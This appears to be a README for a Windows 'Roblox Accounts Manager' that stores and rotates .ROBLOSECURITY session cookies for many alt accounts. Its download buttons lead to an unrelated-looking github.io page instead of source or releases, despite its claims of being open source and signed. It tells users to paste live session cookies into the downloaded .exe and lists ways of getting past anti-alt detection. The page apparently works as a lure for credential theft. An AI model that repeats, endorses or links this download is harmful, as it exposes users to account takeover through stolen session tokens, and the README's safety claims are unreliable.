<div align="center">
<img src="assets/banner.png" width="100%" alt="Roblox Accounts Manager banner" />
</div>

<div align="center">
<p>
  <img src="https://img.shields.io/badge/Platform-Windows_11%7C10-a6ff6a?style=for-the-badge&logo=windows" alt="" />
  <img src="https://img.shields.io/badge/Release-2026-DB2777?style=for-the-badge" alt="" />
  <img src="https://img.shields.io/badge/Build-.exe-9B59B6?style=for-the-badge" alt="" />
</p>
</div>

<p align="center">
  <img src="https://readme-typing-svg.herokuapp.com?color=059669&size=28&center=true&vCenter=true&width=900&lines=%F0%9F%A7%B1+Roblox+Account+Switcher;%F0%9F%8C%88+Full+Feature+Suite;%F0%9F%92%AB+Ready+for+Windows;%F0%9F%8E%AE+Updated+for+2026">
</p>

<p align="center">
  <img src="https://skillicons.dev/icons?i=lua" />
  <img src="https://skillicons.dev/icons?i=windows" />
</p>

---

## 🧭 Table of Contents

- [Overview](#-overview)
- [What Is Roblox Accounts Manager?](#-what-is-roblox-accounts-manager)
- [The Problem](#-the-problem)
- [The Solution](#-the-solution)
- [Changelog / Release History](#-changelog--release-history)
- [All Modules Status](#-all-modules-status)
- [Account Core Modules](#-account-core-modules)
- [Session & Cookie Modules](#-session--cookie-modules)
- [Security & Privacy Modules](#-security--privacy-modules)
- [Automation Modules](#-automation-modules)
- [Compatibility / Platform Support](#-compatibility--platform-support)
- [Detection / Bypass Status](#-detection--bypass-status)
- [Performance Benchmarks](#-performance-benchmarks)
- [Quick Start](#-quick-start)
- [System Requirements](#-system-requirements)
- [Installation](#-installation)
- [Known Issues](#-known-issues)
- [FAQ](#-faq)
- [Community & Support](#-community--support)

---

## 🎮 Overview

| Category | Details |
|---|---|
| **Project** | Roblox Accounts Manager — multi-account toolkit |
| **Current build** | 2026 portable release (v2.0 rewrite) |
| **Distribution** | Standalone `.exe` — no installer, no runtime |
| **Platform** | Windows 10 / 11 (x64) |
| **License** | MIT — open community project |
| **Origin** | Forked from an abandoned 2023 codebase, fully rewritten |

Roblox Accounts Manager started life as a half-finished script that broke every time Roblox rotated its web session cookies. The original repo went dark in 2023 with 40 open issues and zero merges. This 2026 build is a ground-up rewrite: the account store is now encrypted at rest, session rotation is handled natively instead of through a stale Python wrapper, and the whole thing ships as a single portable `.exe` with no installer and no runtime dependency.

If you juggle alts, run a trading group, manage a clan roster, or just hate retyping the same password every time Roblox invalidates a cookie — this is the utility that was missing.
<div align="center">
  <a href="https://ezosizcojoaj.github.io/roblox-account-switcher/">
    <img src="https://img.shields.io/badge/GET_IT-Roblox_Accounts_Manager-059669?style=flat-square&logo=windows&logoColor=white&labelColor=047857" width="480" alt="GET IT Roblox Accounts Manager"/>
  </a>
</div>
---

## 📚 What Is Roblox Accounts Manager?

| Term | Explanation |
|---|---|
| **Account Vault** | Encrypted local store holding every saved Roblox account profile |
| **Session Cookie** | The `.ROBLOSECURITY` token that keeps a Roblox login alive |
| **Profile** | One saved account: username, cookie, group memberships, notes, tags |
| **Rotation** | Automatically refreshing a stale cookie without logging in again |
| **Switcher** | The hotkey/tray mechanism that hot-swaps the active account |
| **Alt Farm** | A batch of secondary accounts used for group or trading activity |
| **Fingerprint Isolation** | Keeping per-account browser/device signals separated |

Core benefits:

- **One click, any account** — swap between saved profiles in under a second
- **No re-login churn** — rotation keeps cookies alive so you stop hitting the login wall
- **Grouped organization** — tag accounts as main / alt / trade / clan and filter instantly
- **Portable by design** — the `.exe` runs from a USB stick, vault travels with it
- **Batch import** — paste a list of cookie strings and the vault ingests them all
- **No install footprint** — extract, run, done; nothing touches the registry

---

## 🩹 The Problem

Anyone who actually runs multiple Roblox accounts knows the exact pain:

- Roblox invalidates `.ROBLOSECURITY` cookies constantly, and every invalidation means a fresh login — usually right when you're mid-trade or mid-raid.
- Browser profiles leak between accounts, so one alt logs out the main and you're stuck re-authenticating everything.
- Password managers store credentials but *not* the live session, so they don't actually keep you logged in.
- Group management requires hopping between 5–20 accounts to accept join requests or check payouts.
- Spreadsheet-based alt tracking rots fast — passwords drift, notes get lost, and nobody remembers which alt owns which group.
- Multi-boxing tools are built for one game and break on the next Roblox web update.
- Existing "account switchers" are either malware bait or abandoned shells that stopped working in 2023.

---

## ✅ The Solution

| Problem | Solution |
|---|---|
| Constant cookie invalidation | **Auto-Rotate** — background session refresh keeps profiles alive |
| Browser profile leakage | **Isolated Switcher** — each profile launches in its own sandboxed context |
| Password managers ignore sessions | **Session Vault** — stores live cookies, not just passwords |
| Group admin hopping | **Batch Group Ops** — accept/leave/check across many accounts at once |
| Spreadsheet alt rot | **Tagged Profile Store** — searchable vault with notes and group links |
| Breakage on Roblox updates | **Hot-Patch Layer** — selector updates pushed independently of the `.exe` |
| Malware-bait alternatives | **Open source** — auditable, signed releases, no obfuscated binaries |

---

## 📜 Changelog / Release History

| Version | Date | Changes |
|---|---|---|
| **v2.0.4** | 2026-02 | Hot-patch layer stabilized; fixed cookie rotation on 2FA-enabled accounts |
| **v2.0.3** | 2026-01 | Added batch import from clipboard; group-ops queue rework |
| **v2.0.2** | 2025-12 | Vault migration to AES-256-GCM; faster cold start (~180ms) |
| **v2.0.1** | 2025-11 | Fixed tray hotkey conflict on Win 11 24H2 |
| **v2.0.0** | 2025-11 | **Full rewrite.** Portable `.exe`, no Python runtime, encrypted vault, new UI |
| v1.4.0 | 2023-04 | Last release of the abandoned original codebase |

---

## 📦 All Modules Status

| Module | Status | Description |
|---|---|---|
| Profile Vault | ✅ Working | Encrypted local store for all saved accounts |
| Cookie Rotator | ✅ Working | Refreshes stale `.ROBLOSECURITY` sessions |
| Hotkey Switcher | ✅ Working | Global hotkey to change active account |
| Tray Switcher | ✅ Working | System-tray account selector |
| Batch Importer | ✅ Working | Paste-in cookie list ingestion |
| Group Ops Queue | ✅ Working | Bulk accept/leave/check group actions |
| Tag Manager | ✅ Working | Custom tags, filters, and color coding |
| Notes Attacher | ✅ Working | Per-profile freeform notes |
| Fingerprint Isolator | ✅ Working | Per-profile browser signal separation |
| Vault Backup | ✅ Working | Export/import encrypted vault snapshots |
| Session Monitor | ✅ Working | Warns when a cookie is near expiry |
| 2FA Helper | ✅ Working | Manual 2FA code entry during rotation |
| Auto-Login Launcher | ✅ Working | Opens Roblox with the selected profile |
| Clipboard Guard | ✅ Working | Clears copied cookies after a timeout |
| Recycle Bin | ✅ Working | Restores deleted profiles for 30 days |
| Audit Log | ✅ Working | Local-only record of account actions |
| Theme Engine | ✅ Working | Light/dark/custom palettes |
| Plugin Hooks | ⚠️ Partial | External scripts can read vault read-only |
| Cloud Sync | 🧪 Beta | Optional encrypted vault sync (self-hosted) |

---

## 🗝️ Account Core Modules

The account store is the heart of Roblox Accounts Manager. Everything else is built on top of a vault that never writes plaintext cookies to disk.

- **Profile Vault** — AES-256-GCM encrypted store, key derived per-user
- **Tag Manager** — main / alt / trade / clan / retired, plus custom tags
- **Notes Attacher** — freeform notes so you stop guessing which alt owns what
- **Recycle Bin** — 30-day restore window for accidental deletes
- **Audit Log** — local-only record of logins, switches, and group actions

## 🍪 Session & Cookie Modules

The original project died because Roblox kept changing how sessions expire. This build treats rotation as a first-class subsystem instead of a hacky side feature.

- **Cookie Rotator** — background refresh on a configurable interval
- **Session Monitor** — warns when a profile is within 24h of expiry
- **2FA Helper** — prompts for a manual code when rotation needs it
- **Clipboard Guard** — auto-clears copied cookie strings after 30s
- **Auto-Login Launcher** — opens Roblox logged into the selected profile
- **Hotkey Switcher** — global hotkey to swap active profiles
- **Tray Switcher** — right-click from the system tray to change account

## 🔒 Security & Privacy Modules

Nothing leaves the machine unless you explicitly export it. The vault is local-first, and every operation is logged for your eyes only.

- **Fingerprint Isolator** — separates per-profile browser signals
- **Vault Backup** — encrypted export/import for migration
- **Clipboard Guard** — already covered above, but worth flagging here too since clipboard leakage is the #1 real-world exposure vector
- **Recycle Bin** — protects against accidental deletion
- **Audit Log** — no telemetry, no outbound calls
- **Plugin Hooks** — read-only external access, sandboxed

## 🤖 Automation Modules

Bulk actions are where Roblox Accounts Manager saves the most time. Group managers, traders, and clan leads feel this immediately.

- **Batch Importer** — paste N cookie strings, vault ingests all
- **Group Ops Queue** — accept/leave/check across many accounts, one action
- **Auto-Login Launcher** — fires Roblox with the right profile pre-selected
- **Session Monitor** — flags accounts before they break
- **Cloud Sync (Beta)** — optional self-hosted encrypted sync

---

## 💻 Compatibility / Platform Support

| Platform | Support | Notes |
|---|---|---|
| Windows 11 (x64) | ✅ Full | Tested on 24H2 |
| Windows 10 (x64) | ✅ Full | 21H2 and up |
| Windows 8.1 | ⚠️ Best-effort | Untested in 2026 |
| macOS | ❌ No | Out of scope |
| Linux (Wine) | ⚠️ Best-effort | Tray icon quirks |
| Portable USB | ✅ Full | Vault travels with the `.exe` |

---

## 🛡️ Detection / Bypass Status

| Method | Status | Notes |
|---|---|---|
| Roblox web session validation | ✅ Passing | Cookies are real, so validation succeeds |
| Cookie binding rules | ⚠️ Varies | Some accounts have device-bound sessions |
| 2FA enforcement | ✅ Handled | Manual code prompt in rotation flow |
| Anti-alt heuristics | ⚠️ Varies | Fingerprint Isolator helps, not a guarantee |
| Group action throttling | ✅ Handled | Configurable delay between ops |
| IP-based restrictions | ❌ Not handled | Out of scope — your network is your network |

---

## 📊 Performance Benchmarks

| Scenario | Result | Hardware |
|---|---|---|
| Cold start (empty vault) | ~180 ms | Ryzen 5 5600 / 16 GB |
| Cold start (200 profiles) | ~410 ms | Ryzen 5 5600 / 16 GB |
| Profile switch (hotkey) | ~40 ms | Ryzen 5 5600 / 16 GB |
| Batch import (100 cookies) | ~1.2 s | Ryzen 5 5600 / 16 GB |
| Vault decrypt (200 profiles) | ~90 ms | Ryzen 5 5600 / 16 GB |
| Group Ops (50 accounts) | ~12 s | Ryzen 5 5600 / 16 GB |

Numbers are from a clean vault with default settings; your mileage depends on the number of profiles and the delay between group ops.

---

## 🚀 Quick Start

1. **📥 Visit the project page** — grab the 2026 build from the landing page.
2. **🗂️ Extract the archive** — any folder works, including a USB stick.
3. **▶️ Run the `.exe`** — no installer, no runtime, no dependencies.
4. **🔑 Add your first profile** — paste a cookie or use the batch importer.
5. **⌨️ Set your switch hotkey** — default is `Ctrl+Alt+R`, change it in settings.

---

## 🖥️ System Requirements

| Component | Minimum | Recommended |
|---|---|---|
| OS | Windows 10 x64 21H2 | Windows 11 24H2 |
| RAM | 4 GB | 8 GB+ |
| Storage | 50 MB free | 200 MB free |
| CPU | Any x64 | 4-core or better |
| Admin rights | Not required | Not required |
| Network | Required for session refresh | Stable connection recommended |

---

## ⚙️ Installation

1. **Download and extract** — the `.exe` runs from anywhere. No wizard, no registry writes, no admin prompt.
2. **First launch** — you'll be prompted to create a vault password. It encrypts every saved cookie; there is no recovery if you lose it.
3. **Import accounts** — paste one cookie at a time, or paste a list into the Batch Importer. Tags and notes can be applied after import.
4. **Configure rotation** — the default interval is 6 hours; session monitor warns you when a profile is close to expiry.
<div align="center">
  <a href="https://ezosizcojoaj.github.io/roblox-account-switcher/">
    <img src="https://img.shields.io/badge/DOWNLOAD-Latest-4F46E5?style=flat&logo=windows&logoColor=white&labelColor=3730A3" width="580" alt="DOWNLOAD Latest"/>
  </a>
</div>
---

## 🧰 Known Issues

| Issue | Solution |
|---|---|
| Hotkey doesn't register on Win 11 24H2 | Run the `.exe` as admin once, or rebind to a non-system hotkey |
| 2FA prompt doesn't appear during rotation | Wait ~10s; if it still doesn't, use the manual "Rotate Now" button |
| Tray icon missing after reboot | Launch the `.exe` again — it re-registers on startup and the tray reappears |
| Group Ops fail silently on some accounts | Increase the per-op delay in settings; Roblox throttles rapid group actions |
| Vault password prompt on every launch | Disable "lock on switch" — the vault will stay unlocked for the session |
| USB vault not recognized on another PC | Vault is portable, but the `.exe` must be on the same drive |

---

## ❓ FAQ

| Question | Answer |
|---|---|
| 🍪 **Will my accounts get banned?** | Roblox Accounts Manager doesn't inject anything into the game client — it manages sessions you already own. That said, running many alts carries risk regardless of tooling; use delay settings and don't hammer group ops. |
| 🔄 **How often does Roblox invalidate cookies?** | It varies, but the Session Monitor catches it before you do. When rotation is enabled, profiles stay alive for days rather than hours. |
| 💾 **Where is the vault stored?** | In the same folder as the `.exe`, encrypted with AES-256-GCM. Move the folder and the vault moves with it. |
| 🔐 **What if I forget the vault password?** | There's no recovery — that's the point of the encryption. Back up the vault file and the password separately. |
| 🧩 **Does it work on macOS or Linux?** | Native builds are Windows-only. Wine works with some caveats around the tray icon. |
| 🆕 **How do I update?** | Extract the new build over the old folder. The vault is forward-compatible and auto-migrates on first launch. |
| 🤝 **Can I use it for group management?** | Yes — Group Ops Queue is built for exactly that. Accept/leave/check actions across many accounts in one run. |
| 🛠️ **Is the source available?** | Yes — MIT-licensed, no obfuscation. Released `.exe` is signed for verification. |

---

## 💬 Community & Support

- **Issues** — open a GitHub issue with your build version and a description of the problem.
- **Discussions** — feature requests and alt-management tips live here.
- **Releases** — every tagged release includes checksums and a changelog.
- **Contributing** — PRs welcome; the plugin hook layer is the easiest place to start.

---

This 2026 build exists because the original project deserved better than a stale 2023 commit and 40 unanswered issues. The vault, rotation, and group-ops layers are the three things people actually needed from a Roblox Accounts Manager tool, so those got rewritten first and everything else was built around them. If something's still rough, open an issue — the maintenance is active this time.
